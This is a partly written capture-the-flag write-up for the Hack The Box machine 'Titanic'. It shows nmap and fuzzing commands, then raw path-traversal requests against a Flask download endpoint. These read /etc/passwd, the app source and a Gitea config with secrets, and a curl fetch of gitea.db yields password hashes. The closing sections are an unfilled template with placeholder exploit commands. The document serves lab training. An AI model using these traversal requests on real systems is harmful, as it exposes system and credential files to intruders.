### Hack The Box Writeup: Titanic

## Overview

- **Machine Name**: Titanic
- **Difficulty**: Easy
- **Platform**: Hack The Box
- **Operating System**: Linux
- **Key Objectives**: 
- **Date Solved**: June 2025


## Tools Used

- **Enumeration**: 
- **Exploitation**: 
- **Privilege Escalation**: 
- **Other**: 

## Methodology

### Initial Enumeration

```bash
nmap -p- --open --min-rate 5000 -sS -n -vvV -Pn 10.10.11.55 -oG allPorts
nmap -sCV -p22,80 10.10.11.55 -oN targeted

# add http://titanic.htb /etc/hosts
whatweb http://titanic.htb
# ans
http://titanic.htb [200 OK] Bootstrap[4.5.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.10.12], IP[10.10.11.55], JQuery, Python[3.10.12], Script, Title[Titanic - Book Your Ship Trip], Werkzeug[3.0.3]

gobuster dir -u http://titanic.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

dirb http://titanic.htb -w /usr/share/dirb/wordlists/common.txt

ffuf -u http://titanic.htb -H "Host: FUZZ.titanic.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200 # use

# Using burpsuite
![alt text](image.png)

# file disclosure vulnerability
# Click on follow redirection to view GET response
![alt text](image-1.png)

eeeafeda-fe86-4dc3-8c8e-bbb9891af355.json # looks like a place in the server

# path traversal
# ans
GET /download?ticket=../../../../../../etc/passwd HTTP/1.1
Host: titanic.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://titanic.htb/book
Origin: http://titanic.htb
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

![alt text](image-2.png)

# ans
HTTP/1.1 200 OK
Date: Mon, 30 Jun 2025 04:06:38 GMT
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Disposition: attachment; filename="../../../../../../etc/passwd"
Content-Type: application/octet-stream
Content-Length: 1951
Last-Modified: Fri, 07 Feb 2025 11:16:19 GMT
Cache-Control: no-cache
ETag: "1738926979.4294043-1951-1015942535"
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false

cat users.txt | grep "bash"
# ans
root:x:0:0:root:/root:/bin/bash
developer:x:1000:1000:developer:/home/developer:/bin/bash

# proc/self/environ
GET /download?ticket=../../../../../../proc/self/environ HTTP/1.1
Host: titanic.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://titanic.htb/book
Origin: http://titanic.htb
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Range: 0-1024 bytes

# app.py from flask
# ans
GET /download?ticket=../../../../../../proc/self/cwd/app.py HTTP/1.1
Host: titanic.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://titanic.htb/book
Origin: http://titanic.htb
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

# ans
HTTP/1.1 200 OK
Date: Mon, 30 Jun 2025 04:17:04 GMT
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Disposition: attachment; filename="../../../../../../proc/self/cwd/app.py"
Content-Type: text/x-python; charset=utf-8
Content-Length: 1598
Last-Modified: Fri, 02 Aug 2024 11:08:07 GMT
Cache-Control: no-cache
ETag: "1722596887.981041-1598-3593539851"
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

from flask import Flask, request, jsonify, send_file, render_template, redirect, url_for, Response
import os
import json
from uuid import uuid4

app = Flask(__name__)

# Directory to save the JSON files
TICKETS_DIR = "tickets"

# Ensure the directory exists
if not os.path.exists(TICKETS_DIR):
    os.makedirs(TICKETS_DIR)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/book', methods=['POST'])
def book_ticket():
    data = {
        "name": request.form['name'],
        "email": request.form['email'],
        "phone": request.form['phone'],
        "date": request.form['date'],
        "cabin": request.form['cabin']
    }

    # Generate a unique ID for the ticket
    ticket_id = str(uuid4())
    json_filename = f"{ticket_id}.json"
    json_filepath = os.path.join(TICKETS_DIR, json_filename)

    # Save the data as a JSON file
    with open(json_filepath, 'w') as json_file:
        json.dump(data, json_file)

    # Redirect to the download URL with the ticket filename
    return redirect(url_for('download_ticket', ticket=json_filename))

@app.route('/download', methods=['GET'])
def download_ticket():
    ticket = request.args.get('ticket')
    if not ticket:
        return jsonify({"error": "Ticket parameter is required"}), 400

    json_filepath = os.path.join(TICKETS_DIR, ticket)

    if os.path.exists(json_filepath):
        return send_file(json_filepath, as_attachment=True, download_name=ticket)
    else:
        return jsonify({"error": "Ticket not found"}), 404

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)

# /etc/hosts
# GET
GET /download?ticket=../../../../../../etc/hosts HTTP/1.1
Host: titanic.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://titanic.htb/book
Origin: http://titanic.htb
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

# ans
HTTP/1.1 200 OK
Date: Mon, 30 Jun 2025 04:19:10 GMT
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Disposition: attachment; filename="../../../../../../etc/hosts"
Content-Type: application/octet-stream
Content-Length: 250
Last-Modified: Fri, 07 Feb 2025 12:04:36 GMT
Cache-Control: no-cache
ETag: "1738929876.3570278-250-789908774"
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

127.0.0.1 localhost titanic.htb dev.titanic.htb
127.0.1.1 titanic

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

# vhost
dev.titanic.htb # adding to /etc/hosts

# gitea docker compose
version: '3'

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"  # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always

# search volume path in file disclosure
GET /download?ticket=../../../../../../home/developer/gitea/data HTTP/1.1
Host: titanic.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://titanic.htb/book
Origin: http://titanic.htb
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

# ans
HTTP/1.1 500 INTERNAL SERVER ERROR
Date: Mon, 30 Jun 2025 04:30:45 GMT
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Type: text/html; charset=utf-8
Content-Length: 265
Connection: close

<!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>

# creating a docker container
mkdir gitea
cd gitea
nvim docker-compose.yml

# paste
version: '3'

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"  # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always

docker compose up -d
docker compose ps
docker compose exec gitea -it sh

# paths in local machine to search in burpsuite
cd /data/gitea/conf
cat app.ini

# ans
PP_NAME = Gitea: Git with a cup of tea
RUN_MODE = prod

[repository]
ROOT = /data/git/repositories

[repository.local]
LOCAL_COPY_PATH = /data/gitea/tmp/local-repo

[repository.upload]
TEMP_PATH = /data/gitea/uploads

[server]
APP_DATA_PATH = /data/gitea
DOMAIN           = localhost
SSH_DOMAIN       = localhost
HTTP_PORT        = 3000
ROOT_URL         = 
DISABLE_SSH      = false
SSH_PORT         = 22
SSH_LISTEN_PORT  = 22
LFS_START_SERVER = false

[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST    = localhost:3306
NAME    = gitea
USER    = root
PASSWD  = 
LOG_SQL = false

[indexer]
ISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve

[session]
PROVIDER_CONFIG = /data/gitea/sessions

[picture]
AVATAR_UPLOAD_PATH = /data/gitea/avatars
REPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars

[attachment]
PATH = /data/gitea/attachments

[log]
MODE = console
LEVEL = info
ROOT_PATH = /data/gitea/log

[security]
INSTALL_LOCK = false
SECRET_KEY   = 
REVERSE_PROXY_LIMIT = 1
REVERSE_PROXY_TRUSTED_PROXIES = *

[service]
DISABLE_REGISTRATION = false
REQUIRE_SIGNIN_VIEW  = false

[lfs]
PATH = /data/git/lfs

# Saerchin files in remote machine
# GET
GET /download?ticket=../../../../../../home/developer/gitea/data/gitea/conf/app.ini HTTP/1.1
Host: titanic.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://titanic.htb/book
Origin: http://titanic.htb
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

# ANS
HTTP/1.1 200 OK
Date: Mon, 30 Jun 2025 04:40:49 GMT
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Disposition: attachment; filename="../../../../../../home/developer/gitea/data/gitea/conf/app.ini"
Content-Type: application/octet-stream
Content-Length: 2004
Last-Modified: Fri, 02 Aug 2024 10:42:14 GMT
Cache-Control: no-cache
ETag: "1722595334.8970726-2004-3839433238"
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

APP_NAME = Gitea: Git with a cup of tea
RUN_MODE = prod
RUN_USER = git
WORK_PATH = /data/gitea

[repository]
ROOT = /data/git/repositories

[repository.local]
LOCAL_COPY_PATH = /data/gitea/tmp/local-repo

[repository.upload]
TEMP_PATH = /data/gitea/uploads

[server]
APP_DATA_PATH = /data/gitea
DOMAIN = gitea.titanic.htb
SSH_DOMAIN = gitea.titanic.htb
HTTP_PORT = 3000
ROOT_URL = http://gitea.titanic.htb/
DISABLE_SSH = false
SSH_PORT = 22
SSH_LISTEN_PORT = 22
LFS_START_SERVER = true
LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4
OFFLINE_MODE = true

[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD = 
LOG_SQL = false
SCHEMA = 
SSL_MODE = disable

[indexer]
ISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve

[session]
PROVIDER_CONFIG = /data/gitea/sessions
PROVIDER = file

[picture]
AVATAR_UPLOAD_PATH = /data/gitea/avatars
REPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars

[attachment]
PATH = /data/gitea/attachments

[log]
MODE = console
LEVEL = info
ROOT_PATH = /data/gitea/log

[security]
INSTALL_LOCK = true
SECRET_KEY = 
REVERSE_PROXY_LIMIT = 1
REVERSE_PROXY_TRUSTED_PROXIES = *
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8
PASSWORD_HASH_ALGO = pbkdf2

[service]
DISABLE_REGISTRATION = false
REQUIRE_SIGNIN_VIEW = false
REGISTER_EMAIL_CONFIRM = false
ENABLE_NOTIFY_MAIL = false
ALLOW_ONLY_EXTERNAL_REGISTRATION = false
ENABLE_CAPTCHA = false
DEFAULT_KEEP_EMAIL_PRIVATE = false
DEFAULT_ALLOW_CREATE_ORGANIZATION = true
DEFAULT_ENABLE_TIMETRACKING = true
NO_REPLY_ADDRESS = noreply.localhost

[lfs]
PATH = /data/git/lfs

[mailer]
ENABLED = false

[openid]
ENABLE_OPENID_SIGNIN = true
ENABLE_OPENID_SIGNUP = true

[cron.update_checker]
ENABLED = false

[repository.pull-request]
DEFAULT_MERGE_STYLE = merge

[repository.signing]
DEFAULT_TRUST_MODEL = committer

[oauth2]
JWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g

# database
[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD = 
LOG_SQL = false
SCHEMA = 
SSL_MODE = disable

# Put new path traversal
GET /download?ticket=../../../../../../home/developer/gitea/data/gitea/gitea.db HTTP/1.1
Host: titanic.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://titanic.htb/book
Origin: http://titanic.htb
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

# download using curl
/download?ticket=../../../../../../home/developer/gitea/data/gitea/gitea.db
>
curl 'http://titanic.htb/download?ticket=../../../../../../home/developer/gitea/data/gitea/gitea.db' -o gitea.db

sqlite3 gitea.db .dump

sqlite3 gitea.db
.schema
.tables

SELLECT *
FROM USER

#  ANS
1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0
2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1722603397|1722603397|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0

```
---
## User Information Table

| Column | User 1 (Administrator) | User 2 (Developer) |
|---|---|---|
| **ID** | 1 | 2 |
| **Username** | administrator | developer |
| **Full Name** | administrator | developer |
| **Email** | root@titanic.htb | developer@titanic.htb |
| **Is Admin** | 0 | 0 |
| **Status** | enabled | enabled |
| **Password Hash** | cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136 | e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56 |
| **Password Salt & Iterations** | pbkdf2$50000$50 | pbkdf2$50000$50 |
| **Login Source** | 0 | 0 |
| **Last Login** | 0 | 0 |
| **Last Active** | 0 | 0 |
| **Prohibit Login** | 0 | 0 |
| **Avatar** | 70a5bd0c1a5d23caa49030172cdcabdc | 0ce6f07fc9b557bc070fa7bef76a0d15 |
| **Gravatar ID** | 2d149e5fbd1b20cf31db3e3c6a28fc9b | 8bf3e3452b78544f8bee9400d6936d34 |
| **Language** | en-US | en-US |
| **Created** | 1722595379 | 1722595646 |
| **Updated** | 1722597477 | 1722603397 |
| **Last Repo Activity** | 1722597477 | 1722603397 |
| **Auth Source ID** | 0 | 0 |
| **Location** | -1 | -1 |
| **Website** | 1 | 1 |
| **Description** | 1 | 0 |
| **Is Restricted** | 0 | 0 |
| **Show Footnotes** | 0 | 0 |
| **Max Repo Creation** | 0 | 0 |
| **Is Active** | 1 | 1 |
| **Access Token Hash** | 0 | 0 |
| **Refresh Token Hash** | 2e1e70639ac6b0eecbdab4a3d19e0f44 | e2d95b7e207e432f62f3508be406c11b |
| **Ransom Email** | root@titanic.htb | developer@titanic.htb |
| **Keep Email Public** | 0 | 0 |
| **Theme** | 0 | 0 |
| **Diff View Style** | 0 | 0 |
| **Signatures** | 0 | 2 |
| **Two Factor Enabled** | 0 | 0 |
| **Two Factor Secret** | 0 | 0 |
| **Two Factor OTPs** | 0 | 0 |
| **Login Type** | 0 | 0 |
| **Auth Source Name** | gitea-auto | gitea-auto |
| **Show Member Profile** | 0 | 0 |

### Preparing hashes (example)
```bash
>
cat hashExample.txt | while read data; do echo "$data"; done
#  ANS
48656c6c6f0a|536570696f6c0a|sam
416c6f6f6f68|536e6f7764656e0a|edward

cat hashExample.txt | while read data; do digest=$(echo "$data" | cut -d '|' -f1); echo ${digest}; done

# ANS
48656c6c6f0a
416c6f6f6f68

cat hashExample.txt | while read data; do digest=$(echo "$data" | cut -d '|' -f1); salt=$(echo "$data" | cut -d '|' -f2); name=$(echo "$data" | cut -d '|' -f3); echo ${digest}:${salt}:${name}; done

# ANS
48656c6c6f0a:536570696f6c0a:sam
416c6f6f6f68:536e6f7764656e0a:edward





```

\[Explain findings, e.g., open ports, services, versions.\]

### Exploitation

\[Detail the exploitation process, including vulnerabilities targeted and how you exploited them.\]

```bash
# Example: Exploiting Samba with Metasploit
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS [machine_ip]
run
```

\[Describe the outcome, e.g., initial shell access, user-level credentials.\]

### Privilege Escalation

\[Explain how you escalated privileges to root/admin. Include any misconfigurations or exploits used.\]

```bash
# Example: Checking for SUID binaries
find / -perm -4000 2>/dev/null
```

\[Describe the final access achieved, e.g., root shell, admin credentials.\]

## Challenges Faced

\[List specific challenges encountered, e.g., difficulty identifying the correct exploit, dealing with restricted shells.\]

- **Challenge 1**: \[e.g., Nmap scans were blocked by a firewall.\]
  - **Solution**: \[e.g., Used --script-args to bypass restrictions.\]
- **Challenge 2**: \[e.g., Password cracking took too long.\]
  - **Solution**: \[e.g., Optimized wordlist with custom rules in Hashcat.\]

## Lessons Learned

\[Summarize key takeaways from solving the machine.\]

- Learned to identify \[specific vulnerability, e.g., outdated Samba versions\] through thorough enumeration.
- Improved skills in \[technique, e.g., manual exploit development for CVE-XXXX-XXXX\].
- Gained experience with \[tool, e.g., LinPEAS for privilege escalation\].

## References

- \[Link to HTB machine page, e.g., https://app.hackthebox.com/machines/Lame\]
- \[CVE details, e.g., https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-XXXX-XXXX\]
- \[Tool documentation, e.g., https://nmap.org/book/man.html\]
- \[Relevant blog post or tutorial, e.g., https://example.com/samba-exploit-guide\]

---

*Written by YourName, \[Month Year\]. Feedback welcome at \[your contact, e.g., GitHub profile\].*